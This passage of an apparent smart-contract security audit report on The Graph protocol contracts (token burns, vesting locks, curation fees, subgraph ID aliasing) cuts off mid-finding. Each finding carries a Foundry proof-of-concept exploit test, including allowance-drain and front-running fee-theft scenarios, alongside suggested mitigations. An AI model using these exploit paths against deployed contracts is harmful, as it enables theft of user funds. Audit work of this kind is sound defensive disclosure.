    grt.approve(address(stakingHarness), 10 ether);
    stakingHarness.delegate(sp, verifier, 10 ether, 1);
    stakingHarness.undelegate(sp, verifier, 10 ether);
    vm.stopPrank();

    vm.warp(block.timestamp + 2 days);

    IHorizonStakingTypes.Provision memory p = stakingHarness.getProvision(sp, verifier);
    assertEq(p.sharesThawing, 0);

    vm.expectRevert();
    stakingHarness.getThawedTokens(IHorizonStakingTypes.ThawRequestType.Delegation, sp, verifier, delegator);
}

## Suggested Mitigation
Branch on requestType. For Delegation, load DelegationPoolInternal and use pool.tokensThawing, pool.sharesThawing, and pool.thawingNonce. Keep the existing provision accounting only for Provision requests.


## [L-55]. Inherited burn functions let non-gateway callers reduce L2 supply outside bridgeBurn

## id: ICHWsJrCQfEZOJnrkIIwm

## Derived From Pattern/Invariant
AccountingInvariantViolation: every L2 supply decrease must go through bridgeBurn and emit BridgeBurned

## Exploit Type
AccountingInvariantViolation

## Location
L2GraphToken.burn, burnFrom

## Finding Status: Valid
### Finding Status Justification: The finding describes the same mechanically present inheritance path: L2GraphToken inherits GraphTokenUpgradeable, which inherits ERC20BurnableUpgradeable. The provided L2GraphToken only restricts bridgeBurn() with onlyGateway; it does not disable inherited public burn() or burnFrom(). Therefore a non-gateway holder can destroy their own L2 GRT, and an allowance holder can burn from an approved account, reducing totalSupply outside bridgeBurn and without BridgeBurned. The affected contract path is explicitly in scope. There is no complete safeguard because only the bridgeBurn wrapper is gated; the inherited public functions remain independent external entrypoints. The provided comments indicate bridge-only mint/burn intent, so the exact risk is not accepted by design. The execution path exists now and does not require governance, admin, leaked keys, or hypothetical future changes. Allowance-based burnFrom may involve an approval, but the root issue also includes direct holder burn and public protocol behavior, so it is not solely victim misuse without protocol fault.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
L2GraphToken restricts bridgeBurn() to the gateway, but it also inherits ERC20BurnableUpgradeable through GraphTokenUpgradeable. That leaves public burn() and burnFrom() entrypoints available outside the bridge path. As a result, totalSupply can decrease without msg.sender == gateway and without BridgeBurned being emitted.

Vulnerable snippet:
```solidity
contract L2GraphToken is GraphTokenUpgradeable, IArbToken { ... }

abstract contract GraphTokenUpgradeable is GraphUpgradeable, Governed, ERC20BurnableUpgradeable { ... }

function bridgeBurn(address _account, uint256 _amount) external override onlyGateway {
    burnFrom(_account, _amount);
    emit BridgeBurned(_account, _amount);
}
```
The inherited burn() and burnFrom() functions remain callable independently of bridgeBurn().

## Impact
Any holder can destroy their L2 GRT without a corresponding L1 release, and any approved spender can destroy an approved balance. This breaks the bridge accounting invariant that L2 supply decreases only through bridgeBurn(account, amount) and can cause BridgeBurned-based accounting or monitoring to miss supply deltas. The direct impact is accounting inconsistency and potential user balance loss, so severity is Low.

## Proof of Concept
1. A user holds L2 GRT.
2. The configured gateway is a separate address.
3. The user calls inherited burn(amount), or an approved spender calls inherited burnFrom(user, amount).
4. totalSupply and the user balance decrease even though the caller is not the gateway and bridgeBurn() was never executed.

## Proof of Code
pragma solidity ^0.7.6;

import { Test } from "forge-std/Test.sol";
import { L2GraphToken } from "../contracts/l2/token/L2GraphToken.sol";

contract L2GraphTokenHarness is L2GraphToken {
    function harnessInitialize(address owner) external {
        _initialize(owner, 0);
    }
}

contract L2GraphTokenBurnBypassTest is Test {
    function testHolderCanBurnOutsideBridgeBurn() public {
        address governor = address(0x1000);
        address gateway = address(0x2000);
        address alice = address(0x3000);

        L2GraphTokenHarness token = new L2GraphTokenHarness();
        token.harnessInitialize(governor);

        vm.prank(governor);
        token.setGateway(gateway);

        vm.prank(governor);
        token.mint(alice, 100 ether);

        uint256 supplyBefore = token.totalSupply();
        uint256 balanceBefore = token.balanceOf(alice);

        vm.prank(alice);
        token.burn(40 ether);

        assertTrue(alice != gateway);
        assertEq(token.totalSupply(), supplyBefore - 40 ether);
        assertEq(token.balanceOf(alice), balanceBefore - 40 ether);
    }

    function testApprovedSpenderCanBurnFromOutsideBridgeBurn() public {
        address governor = address(0x1000);
        address gateway = address(0x2000);
        address alice = address(0x3000);
        address spender = address(0x4000);

        L2GraphTokenHarness token = new L2GraphTokenHarness();
        token.harnessInitialize(governor);

        vm.prank(governor);
        token.setGateway(gateway);

        vm.prank(governor);
        token.mint(alice, 100 ether);

        vm.prank(alice);
        token.approve(spender, 25 ether);

        uint256 supplyBefore = token.totalSupply();
        uint256 balanceBefore = token.balanceOf(alice);

        vm.prank(spender);
        token.burnFrom(alice, 25 ether);

        assertTrue(spender != gateway);
        assertEq(token.totalSupply(), supplyBefore - 25 ether);
        assertEq(token.balanceOf(alice), balanceBefore - 25 ether);
        assertEq(token.allowance(alice, spender), 0);
    }
}

## Suggested Mitigation
Disable non-bridge burns on L2GraphToken. Override burn() and burnFrom() to revert for external callers, or refactor the token so L2GraphToken does not inherit ERC20BurnableUpgradeable. Implement bridgeBurn() with a dedicated gateway-only internal burn path that consumes the gateway allowance and emits BridgeBurned for every bridge supply decrease.


## [M-56]. Floor-rounded periods allow GraphTokenLock to release more than managedAmount before endTime

## id: 74fz6Sq8txN88eCpDtx-d

## Derived From Pattern/Invariant
ConfigFootgun: floor-rounded period duration causes schedule/accounting invariant violation

## Exploit Type
AccountingInvariantViolation

## Location
GraphTokenLock.availableAmount / releasableAmount / release

## Finding Status: Valid
### Finding Status Justification: The schedule math is as described. periodDuration floors duration / periods, passedPeriods is not capped to periods, and availableAmount returns passedPeriods * amountPerPeriod whenever currentTime is not greater than endTime. For non-divisible schedules this can compress the schedule; before endTime, passedPeriods can equal or exceed periods, and with surplus balance release can transfer and record more than managedAmount. currentBalance only limits transfer to held balance and does not preserve managed accounting. SafeMath underflow in later views is an impact, not a safeguard. The code is in scope and not documented as an accepted risk. A beneficiary can exercise release through normal role permissions once such a schedule and surplus balance exist, without needing trusted-role compromise or a pure user mistake.
### Finding Complexity: 0
## Minimim Privilege Required:RequiresRole


## Description
availableAmount() uses floor-rounded periodDuration() and does not cap passedPeriods() to periods. For non-divisible schedules, the floor can compress the vesting schedule; passedPeriods() can equal or exceed periods before endTime and can exceed periods at endTime because the full-release branch only triggers when current > endTime. If the lock holds any surplus, release() can count that surplus as scheduled managed tokens and set releasedAmount above managedAmount. Vulnerable snippet: if (current > endTime) { return managedAmount; } return passedPeriods().mul(amountPerPeriod()); ... uint256 releasable = availableAmount().sub(releasedAmount); return MathUtils.min(currentBalance(), releasable); releasedAmount = releasedAmount.add(amountToRelease);

## Impact
The beneficiary can receive all scheduled tokens before the configured endTime and, when surplus exists, can push releasedAmount above managedAmount. This violates releasedAmount + revokedAmount <= managedAmount and can make totalOutstandingAmount()/surplusAmount() revert through SafeMath underflow, breaking subsequent accounting for the lock.

## Proof of Concept
1. Initialize a lock with managedAmount=1000, startTime=1000, endTime=1009, periods=5. 2. periodDuration() floors to 1 second. 3. At timestamp 1006, before endTime, passedPeriods() is 6 and availableAmount() is 1200. 4. If the wallet has 200 surplus tokens, release() transfers 1200 and records releasedAmount=1200, greater than managedAmount. 5. totalOutstandingAmount() now underflows because managedAmount - releasedAmount is negative.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;

import "forge-std/Test.sol";
import "../contracts/GraphTokenLockSimple.sol";
import "../contracts/IGraphTokenLock.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract MockGRT is ERC20 {
    constructor() ERC20("Graph", "GRT") {}
    function mint(address to, uint256 amount) external { _mint(to, amount); }
}

contract GraphTokenLockOverReleasePoC is Test {
    function testFloorRoundedPeriodsAllowOverReleaseBeforeEndTime() external {
        address beneficiary = address(0xBEEF);
        MockGRT token = new MockGRT();
        GraphTokenLockSimple lock = new GraphTokenLockSimple();
        uint256 managed = 1000 ether;
        lock.initialize(address(this), beneficiary, address(token), managed, 1000, 1009, 5, 0, 0, IGraphTokenLock.Revocability.Disabled);
        token.mint(address(lock), 1200 ether);

        vm.warp(1006);
        assertGt(lock.endTime(), block.timestamp);
        assertGt(lock.availableAmount(), managed);

        vm.prank(beneficiary);
        lock.release();

        assertEq(token.balanceOf(beneficiary), 1200 ether);
        assertGt(lock.releasedAmount(), managed);
        vm.expectRevert();
        lock.totalOutstandingAmount();
    }
}


## Suggested Mitigation
Use current >= endTime for the full unlock branch, cap elapsed periods with MathUtils.min(passedPeriods(), periods), and avoid floor-compressing the schedule by validating duration % periods == 0 or using a schedule formula that cannot return more than managedAmount.


## [H-57]. Removed token destinations retain max allowances and can keep pulling locked GRT

## id: tGL--FFG0yJrpcnUf20b8

## Derived From Pattern/Invariant
AllowanceRace / AccountingInvariantViolation

## Exploit Type
AllowanceRace

## Location
GraphTokenLockManager.removeTokenDestination

## Finding Status: Valid
### Finding Status Justification: The stale allowance path exists in the shown code. approveProtocol grants unlimited allowance to manager destinations, removeTokenDestination only removes from the enumerable set, and revokeProtocol later cannot see or clear removed destinations. A removed spender with a pull path can continue using transferFrom. No full safeguard or accepted-risk documentation is present.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
GraphTokenLockWallet.approveProtocol() grants type(uint256).max allowance to every manager destination, but GraphTokenLockManager.removeTokenDestination() only removes the destination from the enumerable set and does not clear allowances already granted by existing wallets. GraphTokenLockWallet.revokeProtocol() later iterates only the current manager destination list, so the removed spender is skipped forever. Vulnerable snippets: `function removeTokenDestination(address _dst) external override onlyOwner { require(_tokenDestinations.remove(_dst), "Destination already removed"); emit TokenDestinationAllowed(_dst, false); }` and `function revokeProtocol() external onlyBeneficiary { address[] memory dstList = manager.getTokenDestinations(); for (uint256 i = 0; i < dstList.length; i++) { token.approve(dstList[i], 0); } }`. Any destination that was previously approved, or any public pull path on that destination, can continue transferring locked wallet tokens even after governance removes it as an allowed protocol destination.

## Impact
A removed or deprecated destination can continue draining locked GRT from every wallet that previously called approveProtocol(), bypassing the manager destination set as the intended source of truth. If affected wallets contain more than $1M of GRT, this can cause direct loss of user funds from protocol token-lock wallets.

## Proof of Concept
1. Owner adds destination D. 2. A beneficiary calls approveProtocol(), giving D unlimited allowance from the wallet. 3. Owner removes D with removeTokenDestination(D). 4. The beneficiary calls revokeProtocol(), but D is no longer in getTokenDestinations() and is not zeroed. 5. D calls token.transferFrom(wallet, attacker, amount) and pulls locked GRT despite manager.isTokenDestination(D) being false.

## Proof of Code
pragma solidity ^0.7.6;
import "forge-std/Test.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "../contracts/GraphTokenLockManager.sol";
import "../contracts/GraphTokenLockWallet.sol";
contract MockGRT is ERC20 { constructor() ERC20("GRT","GRT") { _mint(msg.sender, 1e30); } }
contract Puller { IERC20 public token; constructor(IERC20 t){ token=t; } function drain(address from,address to,uint256 amount) external { require(token.transferFrom(from,to,amount), "pull failed"); } }
contract StaleDestinationAllowanceTest is Test { function testRemovedDestinationCanStillDrain() public { MockGRT token = new MockGRT(); GraphTokenLockWallet master = new GraphTokenLockWallet(); GraphTokenLockManager manager = new GraphTokenLockManager(token, address(master)); Puller puller = new Puller(token); address beneficiary = address(0xBEEF); address attacker = address(0xA11CE); token.transfer(address(manager), 1000 ether); manager.addTokenDestination(address(puller)); manager.createTokenLockWallet(address(this), beneficiary, 1000 ether, 100, 1000, 10, 0, 0, IGraphTokenLock.Revocability.Disabled); bytes memory init = abi.encodeWithSelector(GraphTokenLockWallet.initialize.selector, address(manager), address(this), beneficiary, address(token), 1000 ether, 100, 1000, 10, 0, 0, IGraphTokenLock.Revocability.Disabled); address wallet = manager.getDeploymentAddress(keccak256(init), address(master)); vm.prank(beneficiary); GraphTokenLockWallet(payable(wallet)).approveProtocol(); assertEq(token.allowance(wallet, address(puller)), type(uint256).max); manager.removeTokenDestination(address(puller)); vm.prank(beneficiary); GraphTokenLockWallet(payable(wallet)).revokeProtocol(); assertEq(manager.isTokenDestination(address(puller)), false); assertEq(token.allowance(wallet, address(puller)), type(uint256).max); puller.drain(wallet, attacker, 1000 ether); assertEq(token.balanceOf(attacker), 1000 ether); } }

## Suggested Mitigation
Track destinations approved per wallet or require removed destinations to be explicitly revoked from affected wallets. At minimum, expose a revokeRemovedDestination(address dst) path on wallets and make removal a two-step process that prevents stale allowances from remaining active.


## [L-58]. Existing Curation pools allow split dust mints to avoid curation tax due to floor rounding

## id: frbAkGX2vz5p8pc9DDwzX

## Derived From Pattern/Invariant
FeeAccountingDrift / PrecisionDriftAccumulation: curation tax floors to zero on existing-pool dust mints

## Exploit Type
RoundingError

## Location
Curation.tokensToSignal

## Finding Status: Valid
### Finding Status Justification: The rounding path exists in in-scope Curation.sol. tokensToSignal() computes curationTax as _tokensIn * curationTaxPercentage / MAX_PPM using integer floor division. mint() only requires _tokensIn != 0 before calling tokensToSignal(). The minimumCurationDeposit check is inside _tokensToSignal() only when curationPool.tokens == 0, so existing curated pools can accept sub-minimum nonzero mints. For sufficiently small _tokensIn and nonzero curationTaxPercentage, computed curationTax can be zero while _tokensToSignal() may still return nonzero signal depending on pool state and bonding curve output. There is no rounding-up, minimum existing-pool deposit, or rejection of zero-tax taxable mints. The comment claims tax will always be greater than zero because minimumCurationDeposit is 1 GRT, but that safeguard is incomplete for already curated pools. This is permissionless and does not require user error, privileged access, or future changes.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
tokensToSignal computes curationTax = _tokensIn * curationTaxPercentage / MAX_PPM using floor division. The comment assumes minimumCurationDeposit makes tax nonzero, but that minimum is enforced only for first mints into uncurated pools inside _tokensToSignal. Existing curated pools accept any nonzero _tokensIn in mint(), so deposits below MAX_PPM / curationTaxPercentage pay zero tax while still potentially minting nonzero signal. Vulnerable snippet: uint256 curationTax = _tokensIn.mul(uint256(curationTaxPercentage)).div(MAX_PPM); uint256 signalOut = _tokensToSignal(id, _tokensIn.sub(curationTax)); and mint() only requires _tokensIn != 0.

## Impact
A curator can split a taxable deposit into many sub-threshold mints and receive signal on the gross amount while paying less or zero curation tax. This leaks protocol tax/burn value to the curator. Practical severity is limited by GRT's 18-decimal granularity and gas costs, so this is low-impact unless protocol parameters or batching make sub-threshold chunks economically meaningful.

## Proof of Concept
1. A pool is already curated, so minimumCurationDeposit is no longer checked. 2. curationTaxPercentage is nonzero. 3. The curator splits a deposit into chunks where chunk * curationTaxPercentage < 1_000_000. 4. Each mint has curationTax == 0 but can still mint nonzero GCS. 5. A single mint of the same aggregate amount would have burned nonzero curation tax.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;
import "forge-std/Test.sol";
contract TaxRoundingHarness { uint256 constant MAX_PPM = 1_000_000; uint32 public taxPpm = 10_000; uint256 public poolTokens = 1 ether; uint256 public poolSignal = 1 ether; function quote(uint256 tokensIn) public view returns (uint256 signalOut,uint256 tax) { tax = tokensIn * taxPpm / MAX_PPM; uint256 net = tokensIn - tax; signalOut = poolSignal * net / poolTokens; } function mint(uint256 tokensIn) external returns (uint256 signalOut,uint256 tax) { (signalOut,tax)=quote(tokensIn); require(tokensIn != 0,"Cannot deposit zero tokens"); poolTokens += tokensIn - tax; poolSignal += signalOut; } }
contract CurationTaxRoundingPoC is Test { function testSplitDustMintsAvoidTax() external { TaxRoundingHarness c = new TaxRoundingHarness(); uint256 chunk = 99; uint256 n = 101; uint256 splitTax; uint256 splitSignal; for (uint256 i; i < n; i++) { (uint256 sig,uint256 tax) = c.mint(chunk); splitSignal += sig; splitTax += tax; } TaxRoundingHarness single = new TaxRoundingHarness(); (uint256 singleSignal,uint256 singleTax) = single.mint(chunk * n); assertEq(splitTax, 0); assertGt(singleTax, splitTax); assertGt(splitSignal, singleSignal); } }

## Suggested Mitigation
For existing pools, either enforce a minimum mint amount large enough to make tax nonzero when curationTaxPercentage > 0, round curation tax up for nonzero taxable deposits, or reject mints where curationTaxPercentage > 0, _tokensIn > 0, and computed curationTax == 0.


## [H-59]. Just-in-time minting before Curation.collect lets attackers siphon pending query-fee reserves

## id: LW2vZUmlgJ660REGRS4O7

## Derived From Pattern/Invariant
AccountingInvariantViolation: collected fees are assigned to live curation signal instead of a pre-collection snapshot

## Exploit Type
FrontrunMev

## Location
Curation.collect

## Finding Status: Valid
### Finding Status Justification: The vulnerable mechanics are present in the provided in-scope Curation.sol. collect() adds fee tokens to pool reserves without any eligibility snapshot or per-holder fee accounting. mint() is permissionless and immediately increases both reserve accounting and the caller's GCS balance. burn() is also permissionless for owned signal and uses signalToTokens(), which prices against the post-collect reserve. Thus, the stated flow of minting before a pending collect and burning after it matches the code. Slippage checks protect the caller from bad pricing but do not prevent the exploit path. _updateRewards() notifies RewardsManager on mint/burn, but collect() itself does not call it and no shown logic excludes new signal from collected-fee reserves. The issue is in production scope, not explicitly accepted by docs, currently executable with public functions and normal staking collection, and does not depend on user mistake, privileged key compromise, or future integration.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
Curation.collect() increases a pool's token reserves without minting new GCS and without snapshotting which curators were eligible before the fee collection. Because mint() is permissionless, an attacker can see a pending collect() transaction, mint signal into the same pool immediately before it, receive a live share of the pool, then burn immediately after collect() to withdraw a proportional share of fees that were earned before the attacker joined.

Vulnerable snippets:
function collect(bytes32 _subgraphDeploymentID, uint256 _tokens) external override {
    require(msg.sender == address(staking()), "Caller must be the staking contract");
    require(isCurated(_subgraphDeploymentID), "Subgraph deployment must be curated to collect fees");
    CurationPool storage curationPool = pools[_subgraphDeploymentID];
    curationPool.tokens = curationPool.tokens.add(_tokens);
}

function mint(...) external override notPartialPaused returns (uint256, uint256) {
    ...
    curationPool.tokens = curationPool.tokens.add(_tokensIn.sub(curationTax));
    curationPool.gcs.mint(curator, signalOut);
}

The reserve increase is distributed to whoever holds GCS at execution time rather than to the signal holders that existed before the collected query fees became known.

## Impact
A searcher can steal a material share of query-fee GRT from incumbent curators. For large fee-collection batches, this can become a significant direct loss of user funds held in the Curation contract, limited primarily by attacker capital and curation tax.

## Proof of Concept
1. A pool has incumbent curators with existing GCS and a pending staking collect(subgraphId, feeAmount) transaction is visible.
2. The attacker front-runs collect() with mint(subgraphId, largeAmount, lowEnoughMin), receiving newly minted GCS before fees are added.
3. The staking collect() transaction executes and adds feeAmount to pool.tokens without taking an eligibility snapshot.
4. The attacker back-runs with burn(subgraphId, attackerSignal, 0).
5. The burn returns the attacker's deposit plus a proportional share of the newly collected fees, reducing the fee value that should have accrued to incumbent curators.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";

contract CurationModel {
    uint256 constant MAX_PPM = 1_000_000;
    uint256 public taxPpm = 10_000; // 1% curation tax
    address public staking;

    struct Pool {
        uint256 tokens;
        uint256 totalSignal;
    }

    mapping(bytes32 => Pool) public pools;
    mapping(address => mapping(bytes32 => uint256)) public signal;

    constructor(address _staking) {
        staking = _staking;
    }

    function seed(bytes32 id, uint256 tokens, uint256 totalSignal, address incumbent) external {
        pools[id] = Pool(tokens, totalSignal);
        signal[incumbent][id] = totalSignal;
    }

    function mint(bytes32 id, uint256 tokensIn) external returns (uint256 signalOut) {
        Pool storage p = pools[id];
        uint256 tax = (tokensIn * taxPpm) / MAX_PPM;
        uint256 net = tokensIn - tax;
        signalOut = (p.totalSignal * net) / p.tokens;
        p.tokens += net;
        p.totalSignal += signalOut;
        signal[msg.sender][id] += signalOut;
    }

    function collect(bytes32 id, uint256 amount) external {
        require(msg.sender == staking, "only staking");
        pools[id].tokens += amount;
    }

    function burn(bytes32 id, uint256 signalIn) external returns (uint256 tokensOut) {
        Pool storage p = pools[id];
        require(signal[msg.sender][id] >= signalIn, "not enough signal");
        tokensOut = (p.tokens * signalIn) / p.totalSignal;
        signal[msg.sender][id] -= signalIn;
        p.totalSignal -= signalIn;
        p.tokens -= tokensOut;
    }
}

contract CurationCollectFrontrunTest is Test {
    function testFrontrunCollectStealsPendingFees() public {
        bytes32 id = keccak256("subgraph");
        address incumbent = address(0x1);
        address attacker = address(0x2);
        address staking = address(0x3);

        CurationModel c = new CurationModel(staking);
        c.seed(id, 100_000 ether, 100_000 ether, incumbent);

        uint256 attackerCost = 100_000 ether;

        vm.prank(attacker);
        uint256 attackerSignal = c.mint(id, attackerCost);

        vm.prank(staking);
        c.collect(id, 100_000 ether);

        vm.prank(attacker);
        uint256 attackerOut = c.burn(id, attackerSignal);

        assertGt(attackerOut, attackerCost, "attacker profits after tax");
        assertGt(attackerOut - attackerCost, 48_000 ether, "attacker captures pending fees");
    }
}

## Suggested Mitigation
Do not assign collected fees to live, same-block signal. Snapshot eligible total signal before fee collection and accrue fees through a reward index based only on pre-existing GCS, or enforce an epoch/delay so newly minted signal is ineligible for already pending collect() amounts. Another option is to route collections through RewardsManager-style checkpointing before reserves are increased, then make burn() claim only the caller's checkpointed entitlement.


## [M-60]. Unchecked alias arithmetic lets large L1 subgraph IDs wrap into the native L2 namespace

## id: xkzIZMiF7Ae_QNJbXsyRp

## Derived From Pattern/Invariant
DivideByZeroOrOverFlowInCustomMath: L1/L2 subgraph aliasing must be bijective for accepted IDs

## Exploit Type
IntegerOverflow

## Location
L2GNS.getAliasedL2SubgraphID / getUnaliasedL1SubgraphID

## Finding Status: Valid
### Finding Status Justification: The cited L2GNS contract is in the analyzed production scope and is compiled with Solidity 0.7.6. The exact helper code exists: getAliasedL2SubgraphID returns _l1SubgraphID + SUBGRAPH_ID_ALIAS_OFFSET and getUnaliasedL1SubgraphID returns _l2SubgraphID - SUBGRAPH_ID_ALIAS_OFFSET using raw operators, not SafeMath calls. Solidity 0.7.x arithmetic wraps. There is no shown bound check rejecting L1 IDs above max - offset or L2 IDs below the offset. The bridge receive path uses getAliasedL2SubgraphID before minting/accounting, so an accepted high L1 ID can map into the low L2 namespace. The path is not documented as an accepted risk, is not merely user misuse, and does not require abusing a trusted role; gateway/counterpart checks authenticate the bridge path but do not eliminate the arithmetic flaw.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
L2GNS is compiled for Solidity 0.7.6, where arithmetic does not automatically revert on overflow or underflow. getAliasedL2SubgraphID returns _l1SubgraphID + SUBGRAPH_ID_ALIAS_OFFSET without SafeMath, and getUnaliasedL1SubgraphID returns _l2SubgraphID - SUBGRAPH_ID_ALIAS_OFFSET without a range check. For any accepted L1 subgraph ID greater than type(uint256).max - SUBGRAPH_ID_ALIAS_OFFSET, the alias wraps into the low ID range instead of remaining in the reserved aliased namespace. The reverse helper can underflow for non-aliased low IDs. Vulnerable snippet: function getAliasedL2SubgraphID(uint256 _l1SubgraphID) public pure returns (uint256) { return _l1SubgraphID + SUBGRAPH_ID_ALIAS_OFFSET; } function getUnaliasedL1SubgraphID(uint256 _l2SubgraphID) public pure returns (uint256) { return _l2SubgraphID - SUBGRAPH_ID_ALIAS_OFFSET; }.

## Impact
A bridged subgraph whose L1 ID is in the overflowing range is minted and tracked under an unintended L2 ID outside the reserved alias range. This can corrupt L1/L2 referential accounting, produce incorrect unaliased IDs in events and refund paths, and can collide with the native L2 ID namespace instead of preserving the intended separation between L1-imported and native subgraphs.

## Proof of Concept
1. Choose an L1 subgraph ID x greater than type(uint256).max - SUBGRAPH_ID_ALIAS_OFFSET. 2. Call getAliasedL2SubgraphID(x), or bridge such an ID through RECEIVE_SUBGRAPH_CODE. 3. The addition wraps modulo 2^256 and returns a low L2 ID below SUBGRAPH_ID_ALIAS_OFFSET. 4. The invariant getAliasedL2SubgraphID(x) >= SUBGRAPH_ID_ALIAS_OFFSET is violated, and getUnaliasedL1SubgraphID on that wrapped low ID underflows to a different value.

## Proof of Code
pragma solidity ^0.8.20;
import 'forge-std/Test.sol';

contract L2GNSAliasMathHarness {
    uint256 public constant OFFSET = 0x1111000000000000000000000000000000000000000000000000000000001111;
    function getAliasedL2SubgraphID(uint256 l1SubgraphID) public pure returns (uint256) {
        unchecked { return l1SubgraphID + OFFSET; }
    }
    function getUnaliasedL1SubgraphID(uint256 l2SubgraphID) public pure returns (uint256) {
        unchecked { return l2SubgraphID - OFFSET; }
    }
}

contract L2GNSAliasOverflowPoC is Test {
    function test_aliasWrapsForLargeAcceptedL1Id() external {
        L2GNSAliasMathHarness gns = new L2GNSAliasMathHarness();
        uint256 overflowingL1Id = type(uint256).max - gns.OFFSET() + 1;
        uint256 l2Id = gns.getAliasedL2SubgraphID(overflowingL1Id);
        assertLt(l2Id, gns.OFFSET());
        assertEq(l2Id, 0);
        uint256 unaliased = gns.getUnaliasedL1SubgraphID(l2Id);
        assertEq(unaliased, type(uint256).max - gns.OFFSET() + 1);
    }
}

## Suggested Mitigation
Use SafeMath for aliasing in Solidity 0.7.6 or add explicit bounds: require(_l1SubgraphID <= type(uint256).max - SUBGRAPH_ID_ALIAS_OFFSET, 'L1_ID_OVERFLOW') and require(_l2SubgraphID >= SUBGRAPH_ID_ALIAS_OFFSET, 'NOT_ALIASED_L2_ID'). Reject overflowing L1 IDs before minting or accounting for an L2 transfer.


## [H-61]. Just-in-time curation around Curation.collect lets MEV searchers steal query-fee reserve increases from existing curators

## id: HQ5iIK4DLrc3zk9gdqq70

## Derived From Pattern/Invariant
RewardCheckpointFreeRiderOrLateJoiner

## Exploit Type
FrontrunMev

## Location
Curation.mint/collect/burn

## Finding Status: Valid
### Finding Status Justification: This is the same live-share accounting issue in in-scope Curation.sol. collect() only requires the staking contract as caller and an already curated pool, then increases curationPool.tokens. It does not mint offsetting GCS, record a pre-fee totalSupply snapshot, checkpoint fee entitlement, or prevent same-block mint/burn. mint() and burn() are public permissionless paths guarded only by pause and slippage checks. Because burn() prices redemption from current pool.tokens and current GCS supply, a holder who mints before collect() can redeem a pro-rata portion of the reserve increase after collect(). No complete safeguard in the provided code blocks this exact MEV ordering. The risk is not expressly documented as intentional, and it does not require a privileged or compromised actor; the staking collect is a normal protocol call, while the attacker only uses public functions.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
Curation.collect() immediately adds newly collected query fees to the pool reserve without snapshotting the GCS holders that earned those fees. Because mint() and burn() are permissionless and GCS can be minted and burned with no holding period, a searcher can mint immediately before a visible staking collect() transaction, let collect() increase reserves, then burn immediately after to withdraw a pro-rata share of the newly collected fees.

Vulnerable snippet:
function collect(bytes32 _subgraphDeploymentID, uint256 _tokens) external override {
    require(msg.sender == address(staking()), "Caller must be the staking contract");
    require(isCurated(_subgraphDeploymentID), "Subgraph deployment must be curated to collect fees");
    CurationPool storage curationPool = pools[_subgraphDeploymentID];
    curationPool.tokens = curationPool.tokens.add(_tokens);
    emit Collected(_subgraphDeploymentID, _tokens);
}

The collected tokens are treated as generic bonding-curve reserves, so any signal holder at processing time can redeem them through burn(), regardless of whether they held signal while the query fees accrued.

## Impact
Existing curators can lose a large fraction of collected query fees to just-in-time minters. For large fee collections, a searcher with sufficient capital or builder ordering can extract significant GRT directly from Curation pool reserves, diluting long-term curators and redirecting protocol fee value.

## Proof of Concept
1. Alice is the only existing curator in a pool with 1000 GRT reserves and 1000 GCS.
2. A staking collect(pool, 1000 GRT) transaction is visible in the mempool.
3. Attacker front-runs with mint(pool, 9000 GRT), receiving 9000 GCS at the pre-collection price.
4. Staking collect executes and adds 1000 GRT to reserves without minting new GCS or snapshotting prior holders.
5. Attacker back-runs with burn(pool, 9000 GCS), receiving 9900 GRT.
6. Attacker profits 900 GRT, which is exactly value Alice would have received from the collected fees absent the just-in-time mint.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";

contract LinearCurationHarness {
    struct Pool { uint256 tokens; uint256 supply; }
    mapping(bytes32 => Pool) public pools;
    mapping(bytes32 => mapping(address => uint256)) public balanceOf;

    function mint(bytes32 id, uint256 tokensIn) external returns (uint256 signalOut) {
        Pool storage p = pools[id];
        if (p.supply == 0) {
            signalOut = tokensIn;
        } else {
            // Same result as BancorFormula's MAX_PPM branch: supply * deposit / reserve.
            signalOut = tokensIn * p.supply / p.tokens;
        }
        p.tokens += tokensIn;
        p.supply += signalOut;
        balanceOf[id][msg.sender] += signalOut;
    }

    function collect(bytes32 id, uint256 tokens) external {
        require(pools[id].tokens != 0, "not curated");
        pools[id].tokens += tokens;
    }

    function burn(bytes32 id, uint256 signalIn) external returns (uint256 tokensOut) {
        Pool storage p = pools[id];
        require(balanceOf[id][msg.sender] >= signalIn, "insufficient signal");
        tokensOut = signalIn * p.tokens / p.supply;
        balanceOf[id][msg.sender] -= signalIn;
        p.supply -= signalIn;
        p.tokens -= tokensOut;
    }
}

contract CurationJustInTimeCollectTest is Test {
    function testJustInTimeMintStealsCollectedFees() external {
        LinearCurationHarness c = new LinearCurationHarness();
        bytes32 id = keccak256("subgraph");
        address alice = address(0xA11CE);
        address attacker = address(0xBEEF);

        vm.prank(alice);
        c.mint(id, 1000 ether);

        vm.prank(attacker);
        c.mint(id, 9000 ether);

        c.collect(id, 1000 ether);

        vm.prank(attacker);
        uint256 attackerOut = c.burn(id, 9000 ether);
        assertEq(attackerOut, 9900 ether);
        assertEq(attackerOut - 9000 ether, 900 ether);

        vm.prank(alice);
        uint256 aliceOut = c.burn(id, 1000 ether);
        assertEq(aliceOut, 1100 ether);
        assertEq(aliceOut + attackerOut, 11000 ether);
    }
}

## Suggested Mitigation
Do not distribute collected fees by directly increasing redeemable bonding-curve reserves for current holders. Snapshot pool signal before collect() and account fees through a per-signal reward index with user reward debt, or enforce an epoch/minimum-holding delay so signal minted after fee accrual cannot redeem those fees. Burn/redemption should only include fee rewards earned by shares that existed at the collection snapshot.


## [H-62]. Removed token destinations retain max allowances and can drain locked GraphTokenLockWallet funds

## id: N_YWYOluJ5Prxux82Jm8I

## Derived From Pattern/Invariant
AllowanceRace / stale allowance invariant: removed token destinations must not retain wallet allowances

## Exploit Type
AllowanceRace

## Location
GraphTokenLockManager / GraphTokenLockWallet.removeTokenDestination/approveProtocol/revokeProtocol

## Finding Status: Valid
